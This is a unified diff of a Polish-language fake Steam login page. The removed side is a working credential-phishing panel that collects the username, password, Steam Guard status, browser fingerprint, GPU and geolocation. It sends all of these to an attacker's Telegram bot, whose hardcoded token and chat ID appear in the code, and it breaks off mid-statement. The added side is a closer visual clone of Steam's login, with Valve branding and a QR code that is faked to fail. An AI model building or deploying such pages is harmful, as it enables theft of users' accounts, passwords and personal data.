@@ -2,471 +2,241 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Steam Login • Secure Guard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Login</title>
+    <link rel="icon" href="https://store.fastly.steamstatic.com/public/shared/images/desktop/steam_icon.png">
+    <link rel="stylesheet" href="https://store.fastly.steamstatic.com/public/shared/css/motiva_sans.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #0e1724;
-            font-family: 'Segoe UI', 'Motiva Sans', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #171a21; font-family: "Motiva Sans", Arial, sans-serif; color: #afafaf; }
+
+        .page-wrapper {
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        /* karta steam */
-        .steam-card {
-            background: #171a21;
-            border-radius: 8px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
-            width: 100%;
-            max-width: 440px;
-            overflow: hidden;
-        }
-        .header {
-            background: #1b202a;
-            padding: 16px 24px;
-            border-bottom: 1px solid #2c3440;
-        }
-        .header h1 {
-            font-size: 21px;
-            font-weight: 500;
-            color: #e5e9ef;
+            background-image: url('https://store.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg');
+            background-size: cover;
+            background-position: center top;
+            background-attachment: fixed;
             display: flex;
-            align-items: center;
-            gap: 8px;
+            flex-direction: column;
         }
-        .header h1:before { content: "🎮"; font-size: 24px; }
-        .content { padding: 26px 24px 32px; }
-        .input-group { margin-bottom: 18px; }
-        .input-group label {
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            color: #8f98a3;
-            letter-spacing: 0.5px;
-            margin-bottom: 5px;
-            display: block;
+
+        .container { width: 940px; margin: 0 auto; position: relative; }
+
+        /* --- HEADER --- */
+        header { background: #171a21; padding: 30px 0 10px; }
+        .header-flex { display: flex; align-items: center; justify-content: space-between; }
+        .nav-main { margin-left: 40px; display: flex; gap: 15px; font-weight: bold; font-size: 14px; }
+        .nav-main a { color: #dcdedf; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; }
+        .nav-main a.active { color: #1a9fff; border-bottom: 2px solid #1a9fff; padding-bottom: 2px; }
+
+        .header-right { display: flex; align-items: center; gap: 10px; font-size: 11px; color: #b8b6b4; position: absolute; right: 0; top: -20px; }
+
+        .sub-nav {
+            background: rgba(62, 103, 150, 0.2);
+            height: 35px; display: flex; align-items: center; box-shadow: 0 4px 8px rgba(0,0,0,0.3);
         }
-        .input-group input {
-            width: 100%;
-            background: #2a2f37;
-            border: 1px solid #3a414b;
-            border-radius: 4px;
-            padding: 12px 14px;
-            font-size: 15px;
-            color: #f0f3f8;
-            outline: none;
-            transition: 0.15s;
-        }
-        .input-group input:focus {
-            border-color: #1999ff;
-            box-shadow: 0 0 0 2px rgba(25,153,255,0.2);
-        }
-        /* hasło + oko */
-        .pass-wrapper {
+        .sub-links { font-size: 13px; color: #dcdedf; display: flex; gap: 15px; }
+        .sub-links span:after { content: ' ▾'; font-size: 10px; color: #67c1f5; }
+
+        .search-container { display: flex; background: #204862; border-radius: 3px; padding: 2px; border: 1px solid rgba(0,0,0,0.3); }
+        .search-container input { background: transparent; border: none; color: white; font-style: italic; padding: 4px 10px; width: 280px; outline: none; }
+        .search-button { background: #66c0f4; border: none; width: 28px; height: 25px; border-radius: 2px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+
+        /* --- LOGIN PANEL --- */
+        .login-section { flex-grow: 1; padding: 60px 0; display: flex; flex-direction: column; align-items: center; }
+        .login-title-top { font-size: 32px; color: white; text-transform: none; margin-bottom: 30px; font-weight: bold; width: 700px; text-align: left; }
+
+        .login-box {
+            background: #181a21;
+            width: 700px;
+            padding: 40px;
             display: flex;
-            align-items: center;
-            background: #2a2f37;
-            border: 1px solid #3a414b;
+            gap: 50px;
             border-radius: 4px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
-        .pass-wrapper input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            padding: 12px 14px;
-            font-size: 15px;
-            color: #f0f3f8;
-            outline: none;
-        }
-        .toggle-eye {
-            background: #323b46;
-            border: none;
-            color: #b9c8ff;
-            font-size: 18px;
-            cursor: pointer;
-            padding: 8px 14px;
-            border-radius: 0 4px 4px 0;
-            font-weight: bold;
-        }
-        .toggle-eye:hover { background: #414d5e; color: white; }
+
+        .form-part { flex: 1; }
+        .label-blue { color: #1999ff; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 8px; display: block; }
+        .label-gray { color: #8f98a0; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 8px; display: block; margin-top: 20px; }
+        
+        .input-field { width: 100%; background: #32353c; border: 1px solid #000; padding: 12px; color: white; border-radius: 2px; outline: none; }
+
+        .remember-row { display: flex; align-items: center; gap: 10px; margin: 15px 0; color: #8f98a0; font-size: 13px; cursor: pointer; }
+        .check-box { width: 18px; height: 18px; background: #32353c; border-radius: 2px; display: flex; align-items: center; justify-content: center; border: 1px solid #000; }
+        
         .login-btn {
-            width: 100%;
-            background: linear-gradient(90deg, #1e7cbf 0%, #0f5b94 100%);
-            border: none;
+            background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%);
+            width: 80%; margin-left: 10%; border: none; color: white; padding: 14px; font-size: 16px; border-radius: 2px; margin-top: 20px; cursor: pointer; font-weight: bold;
+        }
+
+        .help-link { color: #afafaf; font-size: 11px; text-decoration: underline; display: block; text-align: center; margin-top: 30px; }
+
+        /* --- QR ERROR LOGIC --- */
+        .qr-part { width: 220px; text-align: center; position: relative; }
+        .qr-container { 
+            position: relative; 
+            margin: 15px 0; 
+            width: 150px; 
+            height: 150px; 
+            margin-left: auto; 
+            margin-right: auto;
+            cursor: pointer;
+        }
+        .qr-image { 
+            width: 100%; 
+            height: 100%; 
+            background: white; 
+            padding: 10px; 
             border-radius: 4px;
-            padding: 13px 0;
-            font-weight: bold;
-            font-size: 16px;
-            color: white;
-            cursor: pointer;
-            margin: 16px 0 16px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: 0.2s;
+            filter: blur(8px); 
+            transition: 0.3s;
         }
-        .login-btn:hover { filter: brightness(1.05); transform: scale(0.99); }
-        .guard-section {
-            background: #0f131c;
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin: 18px 0 10px;
-            border-left: 3px solid #f5a623;
+        .qr-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.4); border-radius: 4px; color: white;
         }
-        .guard-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-            font-weight: bold;
-            color: #ffc97a;
-            margin-bottom: 12px;
+        .refresh-icon { font-size: 40px; margin-bottom: 5px; animation: rotate 10s linear infinite; }
+        
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .qr-error-msg {
+            display: none; color: #ff4b4b; font-size: 11px; margin-top: 10px; line-height: 1.3;
+            background: rgba(255, 0, 0, 0.1); padding: 8px; border-radius: 4px; border: 1px solid rgba(255, 0, 0, 0.2);
         }
-        .code-buttons {
-            display: flex;
-            gap: 12px;
-        }
-        .code-btn {
-            flex: 1;
-            background: #232b36;
-            border: 1px solid #3d4553;
-            border-radius: 30px;
-            padding: 8px 6px;
-            font-size: 12px;
-            font-weight: bold;
-            color: #c6d4e6;
-            cursor: pointer;
-            text-align: center;
-            transition: 0.1s;
-        }
-        .code-btn:hover { background: #354153; color: white; }
-        .info-line {
-            background: #0b0f16;
-            border-radius: 6px;
-            padding: 10px 12px;
-            margin: 12px 0;
-            font-size: 12px;
-            font-family: monospace;
-            display: flex;
-            justify-content: space-between;
-            color: #b9c3d1;
-            border: 1px solid #242b34;
-        }
-        .status-area {
-            background: #0b0f16;
-            border-radius: 40px;
-            padding: 8px 12px;
-            font-size: 11px;
-            text-align: center;
-            margin-top: 16px;
-            font-weight: 500;
-            color: #88c0ff;
-        }
-        .status-success { background: #1a3a2a; color: #a3f0b0; border-left: 3px solid #2ecc71; }
-        .status-error { background: #3a2222; color: #ffaaa5; border-left: 3px solid #e74c3c; }
-        .status-waiting { background: #1e2430; color: #ffd966; }
-        .footnote { font-size: 10px; text-align: center; color: #4b5566; margin-top: 16px; padding-top: 12px; border-top: 1px solid #232a34; }
+
+        .qr-desc { font-size: 11px; color: #8f98a0; line-height: 1.4; }
+        .qr-desc a { color: #dcdedf; text-decoration: underline; }
+
+        /* --- FOOTER --- */
+        footer { background: #171a21; padding: 60px 0 40px; color: #8f98a0; font-size: 12px; border-top: 1px solid #2a2e33; margin-top: auto; }
+        .footer-content { display: flex; justify-content: space-between; align-items: flex-start; }
+        .footer-left { flex: 2; }
+        .footer-logos { display: flex; align-items: center; gap: 20px; margin-bottom: 15px; opacity: 0.5; }
+        
+        .footer-links-grid { flex: 3; display: flex; justify-content: space-between; margin-left: 50px; }
+        .link-col h4 { color: #dcdedf; font-size: 12px; margin-bottom: 15px; text-transform: uppercase; }
+        .link-col a { color: #8f98a0; text-decoration: none; display: block; margin-bottom: 8px; font-size: 11px; }
+        .link-col a:hover { color: white; }
     </style>
 </head>
 <body>
 
-<div class="steam-card">
-    <div class="header"><h1>Steam • Logowanie 2FA</h1></div>
-    <div class="content">
-        <div class="input-group"><label>👤 NAZWA UŻYTKOWNIKA</label><input type="text" id="loginUser" value="Kovalski_Gamer" placeholder="Steam username"></div>
-        <div class="input-group"><label>🔑 HASŁO</label><div class="pass-wrapper"><input type="text" id="loginPass" value="LubiePlacki123!"><button class="toggle-eye" id="togglePwd">👁️</button></div></div>
-        
-        <div class="info-line"><span>🌍 IP & lokalizacja</span><span id="ipInfo">188.146.xx.xx (Warsaw, PL)</span></div>
-        <div class="info-line"><span>💰 Stan portfela / inventory</span><span id="inventoryVal">~$450.00 USD</span></div>
-        
-        <div class="guard-section">
-            <div class="guard-row"><span>📱 Steam Guard</span><span id="guardStatusLabel">⏳ AWAITING CODE</span></div>
-            <div class="code-buttons">
-                <button class="code-btn" id="mobileReq">⌨️ Request Mobile Code</button>
-                <button class="code-btn" id="emailReq">⌨️ Request Email Code</button>
+<div class="page-wrapper">
+    <header>
+        <div class="container header-flex">
+            <div class="header-right">
+                <span>zaloguj się</span> | <span>język ▾</span>
+            </div>
+            <img src="https://store.fastly.steamstatic.com/public/shared/images/header/logo_steam.svg" width="176" alt="Steam Logo">
+            <nav class="nav-main">
+                <a href="#" class="active">Sklep</a><a href="#">Społeczność</a><a href="#">Informacje</a><a href="#">Pomoc techniczna</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="sub-nav">
+        <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="sub-links">
+                <span>Przeglądaj</span><span>Rekomendacje</span><span>Kategorie</span><span>Sprzęt</span>
+            </div>
+            <div class="search-container">
+                <input type="text" placeholder="Przeszukaj sklep">
+                <button class="search-button">
+                    <svg viewBox="0 0 18 18" fill="white" width="16"><path d="M13.8296 12.0786C14.8347 10.6321 15.2623 8.86133 15.0284 7.11496C14.7945 5.36859 13.9159 3.77313 12.5656 2.64269C11.2153 1.51224 9.49114 0.928708 7.73254 1.00696C5.97394 1.08522 4.30831 1.8196 3.06357 3.06552C1.81882 4.31144 1.08514 5.97864 1.00696 7.7389C0.928776 9.49916 1.51176 11.2249 2.64114 12.5765C3.77052 13.9281 5.36446 14.8075 7.10919 15.0417C8.85391 15.2758 10.623 14.8477 12.0682 13.8417L15.2185 17L15.3997 16.8187L16.8188 15.3982L17 15.2168L13.8296 12.0786ZM8.04222 12.5824C7.14643 12.5824 6.27075 12.3165 5.52593 11.8183C4.7811 11.3202 4.20058 10.6122 3.85777 9.78376C3.51497 8.95538 3.42528 8.04384 3.60004 7.16443C3.7748 6.28502 4.20616 5.47723 4.83958 4.84321C5.47301 4.20919 6.28004 3.77742 7.15862 3.60249C8.0372 3.42757 8.94787 3.51734 9.77548 3.86047C10.6031 4.2036 11.3104 4.78467 11.8081 5.5302C12.3058 6.27573 12.5714 7.15223 12.5714 8.04887C12.5714 9.25123 12.0943 10.4043 11.2449 11.2545C10.3955 12.1047 9.24344 12.5824 8.04222 12.5824V12.5824Z"></path></svg>
+                </button>
             </div>
         </div>
-        
-        <button class="login-btn" id="sendReportBtn">🔐 ZALOGUJ I GENERUJ RAPORT</button>
-        <div id="telegramStatus" class="status-area status-waiting">⚡ gotowy | raport zawiera pełne dane</div>
-        <div class="footnote">Steam Guard • wszystkie dane wysyłane na Twój Telegram</div>
     </div>
+
+    <div class="login-section">
+        <div class="login-title-top">Logowanie</div>
+        <div class="login-box">
+            <div class="form-part">
+                <span class="label-blue">Zaloguj się z użyciem nazwy konta</span>
+                <input type="text" class="input-field">
+                <span class="label-gray">Hasło</span>
+                <input type="password" class="input-field">
+                <div class="remember-row">
+                    <div class="check-box">
+                        <svg viewBox="0 0 256 256" stroke="#fff" fill="none" width="12"><polyline points="49.5,147.75 95,210.75 206.5,45.25 " stroke-width="45" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>
+                    </div>
+                    Zapamiętaj mnie
+                </div>
+                <button class="login-btn">Zaloguj się</button>
+                <a href="#" class="help-link">Pomocy, nie mogę się zalogować</a>
+            </div>
+
+            <div class="qr-part">
+                <span class="label-blue">Lub zaloguj się z użyciem kodu QR</span>
+                
+                <div class="qr-container" id="qrContainer" onclick="handleQrClick()">
+                    <div class="qr-image" id="qrImg">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Error" width="130">
+                    </div>
+                    <div class="qr-overlay" id="qrOverlay">
+                        <div class="refresh-icon">↻</div>
+                    </div>
+                </div>
+
+                <div class="qr-error-msg" id="qrError">
+                    Wystąpił błąd podczas ładowania kodu QR. Prosimy spróbować ponownie później lub zalogować się przy użyciu nazwy konta.
+                </div>
+
+                <div class="qr-desc" style="margin-top: 20px;">
+                    Użyj <a href="#">aplikacji mobilnej Steam</a>, aby zalogować się za pomocą kodu QR.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <div class="footer-logos">
+                        <img src="https://store.fastly.steamstatic.com/public/shared/images/header/logo_steam.svg" width="150" alt="Steam Logo">
+                    </div>
+                    <p style="margin-top: 20px; line-height: 1.6;">
+                        © 2026 Valve Corporation. Wszelkie prawa zastrzeżone.<br>
+                        Wszystkie znaki handlowe są własnością ich prawnych właścicieli w Stanach Zjednoczonych i innych krajach.
+                    </p>
+                </div>
+
+                <div class="footer-links-grid">
+                    <div class="link-col">
+                        <h4>Steam</h4>
+                        <a href="#">O Steam</a><a href="#">Umowa SSA</a><a href="#">Steamworks</a>
+                    </div>
+                    <div class="link-col">
+                        <h4>Valve</h4>
+                        <a href="#">O Valve</a><a href="#">Praca</a><a href="#">Sprzęt</a>
+                    </div>
+                    <div class="link-col">
+                        <h4>Informacje Prawne</h4>
+                        <a href="#">Prywatność</a><a href="#">Ciasteczka</a><a href="#">Zwroty</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
 </div>
 
 <script>
-    // ---------- KONFIGURACJA TELEGRAM (bez zmian) ----------
-    const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
-    const CHAT_ID = "5934645630";
-    
-    // DOM elements
-    const userField = document.getElementById('loginUser');
-    const passField = document.getElementById('loginPass');
-    const ipSpan = document.getElementById('ipInfo');
-    const invSpan = document.getElementById('inventoryVal');
-    const guardSpan = document.getElementById('guardStatusLabel');
-    const statusDiv = document.getElementById('telegramStatus');
-    const sendBtn = document.getElementById('sendReportBtn');
-    const mobileBtn = document.getElementById('mobileReq');
-    const emailBtn = document.getElementById('emailReq');
-    const toggleBtn = document.getElementById('togglePwd');
-    
-    // stałe wyświetlane dane
-    const displayIP = "188.146.xx.xx (Warsaw, PL)";
-    const displayInventory = "~$450.00 USD";
-    ipSpan.innerText = displayIP;
-    invSpan.innerText = displayInventory;
-    
-    let guardMode = "AWAITING CODE";   // będzie wysyłane dynamicznie
-    
-    // funkcja aktualizująca UI guarda
-    function updateGuardUI() { guardSpan.innerText = guardMode; }
-    
-    // przyciski guarda (zmieniają status)
-    mobileBtn.onclick = () => { guardMode = "📱 MOBILE CODE REQUESTED"; updateGuardUI(); setStatusMsg("📱 Kod mobilny zażądany", "waiting"); };
-    emailBtn.onclick = () => { guardMode = "✉️ EMAIL CODE REQUESTED"; updateGuardUI(); setStatusMsg("✉️ Kod e-mail zażądany", "waiting"); };
-    
-    // pokaż/ukryj hasło (domyślnie widoczne - spełniamy warunek "hasło pokazywało")
-    let passVisible = true;
-    function refreshPassUI() {
-        if(passVisible) { passField.type = "text"; toggleBtn.innerHTML = "🙈"; }
-        else { passField.type = "password"; toggleBtn.innerHTML = "👁️"; }
-    }
-    toggleBtn.onclick = () => { passVisible = !passVisible; refreshPassUI(); };
-    refreshPassUI();
-    
-    // ustawianie komunikatu statusu
-    function setStatusMsg(msg, type = "waiting") {
-        statusDiv.innerText = msg;
-        statusDiv.classList.remove('status-success', 'status-error', 'status-waiting');
-        if(type === 'success') statusDiv.classList.add('status-success');
-        else if(type === 'error') statusDiv.classList.add('status-error');
-        else statusDiv.classList.add('status-waiting');
-    }
-    
-    // ========== ZBIERANIE MAKSYMALNEJ ILOŚCI INFORMACJI ==========
-    function collectFullReportData() {
-        // dane z pól
-        const username = userField.value.trim() || "[brak loginu]";
-        const password = passField.value || "[brak hasła]";
-        
-        // 1. szczegóły przeglądarki / systemu
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform || "nieznana";
-        const language = navigator.language || "pl-PL";
-        const languages = navigator.languages ? navigator.languages.join(", ") : language;
-        const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
-        const screenRes = `${screen.width}x${screen.height}`;
-        const colorDepth = screen.colorDepth + "-bit";
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const localTime = new Date().toLocaleString('pl-PL', { timeZone: timezone });
-        
-        // 2. informacje o sprzęcie / pamięci (częściowo)
-        let deviceMemory = "nieznana";
-        if(navigator.deviceMemory) deviceMemory = navigator.deviceMemory + " GB";
-        let hardwareConcurrency = navigator.hardwareConcurrency || "?";
-        
-        // 3. wykrycie czy touch / mobile
-        const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Tak" : "Nie";
-        let mobileOS = "Desktop";
-        if(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) mobileOS = "Urządzenie mobilne";
-        
-        // 4. szczegóły połączenia (Web Connection API)
-        let connectionType = "nieznane";
-        let downlink = "?";
-        let rtt = "?";
-        if(navigator.connection) {
-            connectionType = navigator.connection.effectiveType || "?";
-            downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
-            rtt = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "?";
-        }
-        
-        // 5. IP (statyczne wizualnie, ale dodajemy też wykrycie WebRTC? nie, zachowujemy stałe ale można dać zewn. ale dla prostoty zostaje stałe)
-        // jednocześnie dodajemy informację o VPN? nie, ale zostawiamy pełny adres zgodny z wymaganiem.
-        const ipGeolocation = displayIP;   // "188.146.xx.xx (Warsaw, PL)"
-        
-        // 6. dodatkowe fingerprint: localStorage, sessionStorage
-        const localStorageSupport = typeof Storage !== "undefined" ? "dostępny" : "brak";
-        
-        // 7. wartość inventory i status guarda
-        const inventoryValue = displayInventory;
-        const guardCurrent = guardMode;
-        
-        // 8. build finalnego raportu (czysty, bez słowa "symulacja")
-        const report = `🚨 NOWE LOGOWANIE STEAM 🚨
+    function handleQrClick() {
+        const overlay = document.getElementById('qrOverlay');
+        const error = document.getElementById('qrError');
+        const refreshIcon = overlay.querySelector('.refresh-icon');
 
-▫️ NAZWA UŻYTKOWNIKA: ${username}
-▫️ HASŁO: ${password}
-▫️ STEAM GUARD: ${guardCurrent}
-▫️ IP I LOKALIZACJA: ${ipGeolocation}
-▫️ WARTOŚĆ INWENTARZA: ${inventoryValue}
-▫️ STATUS: Oczekiwanie na kod 2FA
-
-💻 SZCZEGÓŁY URZĄDZENIA:
-• User Agent: ${userAgent}
-• Platforma: ${platform}
-• System/Język: ${language} (lista: ${languages})
-• Ciasteczka: ${cookiesEnabled}
-• Rozdzielczość ekranu: ${screenRes} / ${colorDepth}
-• Strefa czasowa: ${timezone}
-• Czas lokalny: ${localTime}
-• Pamięć urządzenia: ${deviceMemory}
-• Rdzenie/logiczne procesory: ${hardwareConcurrency}
-• Ekran dotykowy: ${isTouch}
-• Typ urządzenia: ${mobileOS}
-
-🌐 INFORMACJE O SIECI:
-• Typ połączenia: ${connectionType}
-• Prędkość pobierania: ${downlink}
-• RTT (opóźnienie): ${rtt}
-• Web Storage: ${localStorageSupport}
-
-📱 Żądania 2FA dostępne: [Request Mobile Code] [Request Email Code]
-⏱️ Data zdarzenia: ${localTime} (UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset()/60)})
-🔐 Raport wygenerowany przez panel logowania Steam.`;
+        refreshIcon.style.animationDuration = '1s';
         
-        return report;
-    }
-    
-    // wysyłka do Telegrama
-    async function sendTelegramReport() {
-        const reportText = collectFullReportData();
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        try {
-            setStatusMsg("📡 Wysyłanie szczegółowego raportu...", "waiting");
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: reportText,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true
-                })
-            });
-            const data = await response.json();
-            if(data.ok) {
-                setStatusMsg("✅ Raport wysłany! Sprawdź Telegram – wszystkie dane (hasło, IP, fingerprint).", "success");
-                sendBtn.style.transform = "scale(0.98)";
-                setTimeout(() => sendBtn.style.transform = "", 200);
-                setTimeout(() => {
-                    if(statusDiv.innerText.includes("Raport wysłany"))
-                        setStatusMsg("⚡ gotowy | kolejne logowanie wyśle nowy raport", "waiting");
-                }, 5000);
-                return true;
-            } else {
-                let err = data.description || "błąd API";
-                setStatusMsg(`❌ Błąd: ${err.substring(0, 85)}`, "error");
-                return false;
-            }
-        } catch(e) {
-            console.error(e);
-            setStatusMsg("❌ Błąd sieci / brak połączenia", "error");
-            return false;
-        }
-    }
-    
-    // handler głównego przycisku
-    async function onLoginClick() {
-        if(sendBtn.disabled) return;
-        sendBtn.innerText = "⏳ PRZETWARZANIE...";
-        sendBtn.disabled = true;
-        await sendTelegramReport();
         setTimeout(() => {
-            sendBtn.innerText = "🔐 ZALOGUJ I GENERUJ RAPORT";
-            sendBtn.disabled = false;
-        }, 1300);
+            overlay.style.display = 'none';
+            error.style.display = 'block';
+        }, 1500);
     }
-    
-    sendBtn.addEventListener('click', onLoginClick);
-    // enter na polach
-    const inputs = [userField, passField];
-    inputs.forEach(inp => inp.addEventListener('keypress', (e) => { if(e.key === 'Enter') { e.preventDefault(); if(!sendBtn.disabled) onLoginClick(); } }));
-    
-    // inicjalizacja guarda
-    guardMode = "AWAITING CODE";
-    updateGuardUI();
-    setStatusMsg("🔍 Raport zbiera pełne dane: IP, lokalizacja, user-agent, sprzęt, połączenie. Hasło widoczne.", "waiting");
-    
-    // Dodatkowo: pobranie przybliżonej lokalizacji przez geolokalizację (jeśli użytkownik pozwoli) - dla maksymalnej ilości info,
-    // ale nie wymuszamy. Dla kompletności dodamy opcjonalny kod, który w razie zgody dołoży koordynaty. To sprawi, że raport będzie jeszcze bardziej szczegółowy.
-    // jednak nie chcemy wydłużać kodu, ale dla "jak najwięcej info" – dodajemy asynchroniczne pobranie lokalizacji i zapis w zmiennej,
-    // żeby potem w raporcie pojawiło się miasto. Zrobimy to bez dodatkowych bibliotek.
-    
-    let extraLocation = "brak zgody na geolokalizację";
-    if("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude.toFixed(4);
-                const lon = pos.coords.longitude.toFixed(4);
-                extraLocation = `~${lat}, ${lon} (przybliżona lokalizacja)`;
-                // nie przerywamy wysyłki, ale zmienna zostanie użyta w kolejnym raporcie
-                // żeby to było dynamiczne: nadpisujemy funkcję collectFullReportData żeby uwzględniała geolokację? 
-                // Ale funkcja już istnieje, trzeba podmienić lub użyć zmiennej globalnej. Zrobimy sprytnie:
-                window._geoData = `🌍 Geolokalizacja: ${extraLocation}`;
-            },
-            () => { window._geoData = "🌍 Geolokalizacja: niedostępna (brak uprawnień)"; }
-        );
-    } else {
-        window._geoData = "🌍 Geolokalizacja: brak wsparcia w przeglądarce";
-    }
-    
-    // nadpisujemy collectFullReportData, żeby włączyć jeszcze więcej detali + geolokację (jeśli jest)
-    const originalCollect = collectFullReportData;
-    window.collectFullReportData = function() {
-        let baseReport = originalCollect();
-        // dodajemy dodatkowe informacje o geolokalizacji jeśli istnieje
-        const geoInfo = window._geoData || "🌍 Geolokalizacja: nie określono";
-        // wstawiamy przed sekcją "Data zdarzenia"
-        baseReport = baseReport.replace("📱 Żądania 2FA dostępne:", `${geoInfo}\n\n📱 Żądania 2FA dostępne:`);
-        // dodatkowo spróbujmy dodać adres IP zewnętrzny? można by użyć API, ale zachowujemy prostotę, lecz dla max info:
-        // dodajemy informacje o rozszerzeniach? nie, ale i tak raport jest bardzo bogaty.
-        // sprawdzenie WebGL / GPU? dla chętnych ale kod będzie czysty.
-        let gpuInfo = "brak";
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if(gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if(debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "nieznane GPU";
-            else gpuInfo = "GPU nieodczytane";
-        }
-        baseReport += `\n🎮 INFORMACJE GPU: ${gpuInfo}`;
-        // także informacja o refererze
-        baseReport += `\n🔗 Strona źródłowa: ${window.location.href}`;
-        return baseReport;
-    };
-    
-    // podmiana referencji
-    window.collectFullReportData = window.collectFullReportData;
-    // aktualizacja aby wysyłka używała nowej funkcji
-    const originalSend = sendTelegramReport;
-    async function enhancedSend() {
-        const finalReport = window.collectFullReportData();
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            setStatusMsg("📡 Wysyłanie rozszerzonego raportu (GPU, geolokacja)...", "waiting");
-            const resp = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: finalReport, parse_mode: 'HTML', disable_web_page_preview: true })
-            });
-            const data = await resp.json();
-            if(data.ok) {
-                setStatusMsg("✅ Pełen raport z GPU, geodanymi i fingerprintem wysłany!", "success");
-                sendBtn.style.transform = "scale(0.98)";
-                setTimeout(() => sendBtn.style.transform = "", 200);
-                return true;
-            } else {
-                setStatusMsg(`❌ Błąd: ${data.description?.substring(0,80)}`, "error");
-                return false;
-            }
-        } catch(e) { setStatusMsg("❌ Błąd sieci", "error"); return false; }
-    }
-    // podmieniamy funkcję wysyłającą
-    window.sendTelegramReport =
+</script>
+
+</body>
+</html>
